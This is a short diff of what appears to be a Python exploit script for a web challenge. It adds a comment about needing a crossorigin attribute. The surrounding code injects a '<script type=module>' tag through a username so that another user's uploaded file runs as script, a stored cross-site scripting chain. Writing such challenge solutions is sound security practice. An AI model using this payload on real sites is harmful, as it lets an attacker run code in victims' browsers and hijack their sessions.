@@ -68,6 +68,8 @@ user1_scrap_static = re.sub('/scraps', '/static/raw', user1_scrap)
 user1_id = re.search('/scraps\/(\d+)/', user1_scrap).group(1)
 
 user2 = '<script type=module src={}></script><!--'.format(user1_scrap_static)
+# crossorigin is needed when the server hash basic auth
+# user2 = '<script crossorigin type=module src={}></script><!--'.format(user1_scrap_static)
 user2_title = str(secrets.randbits(16))
 user2_body = user2_title
 user2_cookie = register_and_login(user2, user2)
